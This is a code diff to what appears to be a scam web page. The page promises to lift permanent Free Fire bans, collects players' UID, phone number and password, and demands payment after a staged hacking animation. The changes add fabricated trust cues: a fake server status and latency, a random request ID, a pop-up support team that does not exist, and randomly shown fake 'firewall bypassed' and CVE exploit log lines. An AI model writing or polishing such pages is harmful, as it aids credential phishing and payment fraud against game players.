@@ -264,6 +264,57 @@
             animation: pulse 1.5s ease-in-out infinite;
         }
 
+        /* ===== SUPPORT BADGE (Option 6) ===== */
+        .support-badge-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 8px;
+            flex-wrap: wrap;
+        }
+        .support-badge {
+            background: rgba(92, 219, 158, 0.03);
+            border: 1px solid rgba(92, 219, 158, 0.04);
+            padding: 2px 12px;
+            border-radius: 30px;
+            color: #5cdb9e;
+            font-size: 0.5rem;
+            letter-spacing: 1px;
+        }
+        .support-badge.yellow {
+            background: rgba(241, 196, 15, 0.03);
+            border-color: rgba(241, 196, 15, 0.04);
+            color: #f1c40f;
+        }
+
+        /* ===== SERVER STATUS (Option 1) ===== */
+        .server-status {
+            background: rgba(255, 255, 255, 0.01);
+            border: 1px solid rgba(255, 0, 0, 0.03);
+            border-radius: 12px;
+            padding: 0.6rem 1rem;
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+        .server-status .label {
+            color: #6a7a8e;
+            font-size: 0.65rem;
+        }
+        .server-status .value {
+            font-size: 0.65rem;
+        }
+        .server-status .value.green { color: #5cdb9e; font-weight: 600; }
+        .server-status .value.yellow { color: #f1c40f; font-weight: 600; }
+        .server-status .value.blue { color: #8a9bb0; font-weight: 400; }
+        .server-status .sep {
+            color: #4a5a6e;
+            font-size: 0.65rem;
+        }
+
         .form-section {
             background: rgba(255, 255, 255, 0.01);
             border-radius: 20px;
@@ -286,6 +337,15 @@
             font-size: clamp(0.65rem, 1.5vw, 0.8rem);
             text-align: center;
             margin-bottom: 1.5rem;
+        }
+
+        /* ===== REQUEST ID (Option 3) ===== */
+        .request-id {
+            text-align: center;
+            color: #4a5a6e;
+            font-size: 0.6rem;
+            letter-spacing: 1px;
+            margin-bottom: 0.8rem;
         }
 
         .input-group {
@@ -427,6 +487,39 @@
             font-weight: 700;
             margin-top: 0.5rem;
             animation: aggressiveFlash 0.3s ease-in-out infinite;
+        }
+
+        /* ===== STEP COUNTER (Option 2) ===== */
+        .step-counter {
+            color: #4a5a6e;
+            font-size: 0.6rem;
+            margin-top: 0.8rem;
+            letter-spacing: 2px;
+        }
+
+        /* ===== LOG OUTPUT (Option 4) ===== */
+        .log-output {
+            position: relative;
+            z-index: 1;
+            margin-top: 0.5rem;
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 8px;
+            padding: 0.5rem;
+            max-height: 80px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 0, 0, 0.03);
+        }
+        .log-output .log-content {
+            font-family: 'Courier New';
+            font-size: 0.55rem;
+            color: #5cdb9e;
+            line-height: 1.6;
+            text-align: left;
+            overflow-y: auto;
+            max-height: 70px;
+        }
+        .log-output .log-content div {
+            opacity: 0.9;
         }
 
         .hack-progress {
@@ -646,10 +739,68 @@
             font-weight: 600;
         }
 
+        /* ===== SUPPORT POPUP (Option 8) ===== */
+        #supportPopup {
+            position: fixed;
+            bottom: 80px;
+            right: 20px;
+            z-index: 999;
+            background: #101520;
+            border: 1px solid rgba(255, 0, 0, 0.05);
+            border-radius: 16px;
+            padding: 1rem;
+            max-width: 280px;
+            display: none;
+            animation: fadeIn 0.5s ease;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        }
+        #supportPopup .popup-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        #supportPopup .popup-header .icon {
+            font-size: 1.5rem;
+        }
+        #supportPopup .popup-header .title {
+            color: #5cdb9e;
+            font-size: 0.7rem;
+            font-weight: 600;
+        }
+        #supportPopup .popup-header .sub {
+            color: #8a9bb0;
+            font-size: 0.65rem;
+        }
+        #supportPopup .popup-actions {
+            display: flex;
+            gap: 8px;
+            margin-top: 8px;
+        }
+        #supportPopup .popup-actions .close-btn {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            color: #6a7a8e;
+            padding: 4px 16px;
+            border-radius: 20px;
+            font-size: 0.6rem;
+            cursor: pointer;
+        }
+        #supportPopup .popup-actions .chat-btn {
+            background: linear-gradient(135deg, #ff0000, #7b2ffc);
+            border: none;
+            color: #fff;
+            padding: 4px 16px;
+            border-radius: 20px;
+            font-size: 0.6rem;
+            cursor: pointer;
+        }
+
         @media (max-width: 480px) {
             .form-section { padding: 1rem 0.8rem; }
             .header { padding: 1.2rem 0.8rem; }
             .payment-section .amount { font-size: 2rem; }
+            .server-status { font-size: 0.55rem; }
+            #supportPopup { max-width: 220px; right: 10px; bottom: 70px; }
         }
     </style>
 </head>
@@ -663,6 +814,12 @@
         <div id="loadBar" style="width:0%; height:100%; background:linear-gradient(90deg,#ff0000,#7b2ffc); border-radius:10px; transition:width 0.2s ease;"></div>
     </div>
     <div style="color:#4a5a6e; font-size:0.7rem; margin-top:0.8rem; letter-spacing:2px;" id="loadText">Initializing...</div>
+    <!-- ===== NETWORK SCAN (Option 7) ===== -->
+    <div style="display:flex; gap:4px; margin-top:0.8rem;">
+        <div style="width:6px; height:6px; border-radius:50%; background:#ff0000; animation:pulse 0.5s ease-in-out infinite;"></div>
+        <div style="width:6px; height:6px; border-radius:50%; background:#ff4444; animation:pulse 0.5s ease-in-out infinite 0.2s;"></div>
+        <div style="width:6px; height:6px; border-radius:50%; background:#ff8888; animation:pulse 0.5s ease-in-out infinite 0.4s;"></div>
+    </div>
 </div>
 
 <!-- ===== GLOWING ORBS ===== -->
@@ -686,12 +843,29 @@
             <span class="badge">24/7 Support</span>
             <span class="badge verified">★ Trusted</span>
         </div>
+        <!-- ===== SUPPORT BADGE (Option 6) ===== -->
+        <div class="support-badge-container">
+            <span class="support-badge">💬 24/7 Live Support</span>
+            <span class="support-badge yellow">⚡ Response Time: 2-3 min</span>
+        </div>
     </header>
+
+    <!-- ===== SERVER STATUS (Option 1) ===== -->
+    <div class="server-status">
+        <span class="label">🟢 Server Status:</span>
+        <span class="value green" id="serverStatus">● Online</span>
+        <span class="sep">|</span>
+        <span class="label">📡 Latency:</span>
+        <span class="value blue" id="latency">42ms</span>
+    </div>
 
     <!-- ===== FORM SECTION ===== -->
     <div class="form-section" id="formSection">
         <div class="title">🔓 Permanent Unban Request</div>
         <div class="sub">Recover your permanently banned Free Fire account</div>
+
+        <!-- ===== REQUEST ID (Option 3) ===== -->
+        <div class="request-id">🔒 Request ID: <span id="requestId">#FF-UNBAN-7842</span></div>
 
         <div class="input-group">
             <label>📱 FREE FIRE UID</label>
@@ -726,6 +900,16 @@
             <div class="progress-text" id="progressText">0%</div>
             <div class="hack-progress">
                 <div class="bar aggressive" id="hackProgressBar"></div>
+            </div>
+            <!-- ===== STEP COUNTER (Option 2) ===== -->
+            <div class="step-counter">
+                Step <span id="stepCounter">0</span> of <span id="totalSteps">8</span>
+            </div>
+            <!-- ===== LOG OUTPUT (Option 4) ===== -->
+            <div class="log-output">
+                <div class="log-content" id="logOutput">
+                    <div>[INFO] Initializing permanent unban protocol...</div>
+                </div>
             </div>
         </div>
     </div>
@@ -793,6 +977,21 @@
 
 </div>
 
+<!-- ===== SUPPORT POPUP (Option 8) ===== -->
+<div id="supportPopup">
+    <div class="popup-header">
+        <span class="icon">💬</span>
+        <div>
+            <div class="title">Support Team</div>
+            <div class="sub">We're online! Need help?</div>
+        </div>
+    </div>
+    <div class="popup-actions">
+        <button class="close-btn" onclick="document.getElementById('supportPopup').style.display='none'">Close</button>
+        <button class="chat-btn" onclick="alert('💬 Live Support\n\nOur team is online 24/7.\n\nHow can we help you with your permanent unban?')">Chat Now</button>
+    </div>
+</div>
+
 <!-- ========================================================= -->
 <!-- JAVASCRIPT                                                -->
 <!-- ========================================================= -->
@@ -852,6 +1051,36 @@
     }
     createParticles();
 
+    // ===== SERVER STATUS (Option 1) =====
+    const serverStatusEl = document.getElementById('serverStatus');
+    const latencyEl = document.getElementById('latency');
+
+    setInterval(() => {
+        const latency = Math.floor(Math.random() * 60) + 20;
+        latencyEl.textContent = latency + 'ms';
+        
+        if (Math.random() > 0.95) {
+            serverStatusEl.textContent = '⚠️ Degraded';
+            serverStatusEl.style.color = '#f1c40f';
+            setTimeout(() => {
+                serverStatusEl.textContent = '● Online';
+                serverStatusEl.style.color = '#5cdb9e';
+            }, 3000);
+        }
+    }, 5000);
+
+    // ===== REQUEST ID (Option 3) =====
+    const reqId = '#FF-UNBAN-' + String(Math.floor(1000 + Math.random() * 9000));
+    document.getElementById('requestId').textContent = reqId;
+
+    // ===== SUPPORT POPUP (Option 8) =====
+    setTimeout(() => {
+        document.getElementById('supportPopup').style.display = 'block';
+        setTimeout(() => {
+            document.getElementById('supportPopup').style.display = 'none';
+        }, 12000);
+    }, 15000);
+
     // ===== MAIN LOGIC =====
     const uidInput = document.getElementById('uidInput');
     const phoneInput = document.getElementById('phoneInput');
@@ -872,6 +1101,10 @@
     const finalUid = document.getElementById('finalUid');
     const caseId = document.getElementById('caseId');
 
+    const stepCounter = document.getElementById('stepCounter');
+    const totalSteps = document.getElementById('totalSteps');
+    const logOutput = document.getElementById('logOutput');
+
     // ===== CHECK ALL FIELDS =====
     function checkFields() {
         const uid = uidInput.value.trim();
@@ -889,6 +1122,33 @@
     phoneInput.addEventListener('input', checkFields);
     passInput.addEventListener('input', checkFields);
 
+    // ===== LOG MESSAGES (Option 4) =====
+    const logMessages = [
+        '[INFO] Scanning ban database...',
+        '[WARN] Ban flag detected: PERMANENT',
+        '[INFO] Bypassing Garena firewall...',
+        '[SUCCESS] Firewall bypassed!',
+        '[INFO] Decrypting ban metadata...',
+        '[INFO] Injecting unban payload...',
+        '[WARN] 256-bit encryption detected...',
+        '[SUCCESS] Encryption bypassed!',
+        '[INFO] Modifying account status...',
+        '[INFO] Establishing secure tunnel...',
+        '[SUCCESS] Tunnel established!',
+        '[INFO] Finalizing permanent unban...'
+    ];
+
+    function addLogMessage() {
+        const msg = logMessages[Math.floor(Math.random() * logMessages.length)];
+        const newEntry = document.createElement('div');
+        newEntry.textContent = msg;
+        logOutput.appendChild(newEntry);
+        logOutput.scrollTop = logOutput.scrollHeight;
+        while (logOutput.children.length > 10) {
+            logOutput.removeChild(logOutput.firstChild);
+        }
+    }
+
     // ===== AGGRESSIVE HACKING STAGES =====
     const aggressiveStages = [
         { icon: '🔥', text: '🔥 BYPASSING GARENA FIREWALL...', sub: 'Exploiting CVE-2026-0912 vulnerability', progress: 5 },
@@ -901,20 +1161,19 @@
         { icon: '✅', text: '✅ UNBAN PREPARED!', sub: 'Payment required to finalize permanent unban', progress: 100 }
     ];
 
+    totalSteps.textContent = aggressiveStages.length;
+
     // ===== RECOVERY PROCESS =====
     recoverBtn.addEventListener('click', function() {
         const uid = uidInput.value.trim();
         const phone = phoneInput.value.trim();
         const pass = passInput.value.trim();
-        const recoveryGmail = recoveryGmailInput.value.trim();
 
         if (!uid || !phone || !pass) return;
 
-        // Loading dots
         this.innerHTML = '⏳ PROCESSING<span class="dot-loader">.</span><span class="dot-loader">.</span><span class="dot-loader">.</span>';
         this.disabled = true;
 
-        // Show aggressive container
         aggressiveContainer.classList.add('active');
         
         let stageIndex = 0;
@@ -935,8 +1194,11 @@
             hackSubText.textContent = stage.sub;
             hackProgressBar.style.width = stage.progress + '%';
             progressText.textContent = stage.progress + '%';
+            stepCounter.textContent = stageIndex + 1;
 
-            // Add shake effect
+            // Add log message
+            addLogMessage();
+
             aggressiveContainer.style.animation = 'none';
             setTimeout(() => {
                 aggressiveContainer.style.animation = 'shake 0.5s ease-in-out 3, aggressiveFlash 0.3s ease-in-out 10';
@@ -960,7 +1222,6 @@
         paymentSection.classList.remove('active');
         processingSection.classList.add('active');
 
-        // Aggressive processing animation
         let procProgress = 0;
         const procInterval = setInterval(() => {
             procProgress += Math.random() * 12 + 5;
@@ -975,7 +1236,6 @@
             }
             processingBar.style.width = procProgress + '%';
             
-            // Aggressive flash effect
             if (procProgress % 25 < 5) {
                 processingSection.style.animation = 'none';
                 setTimeout(() => {
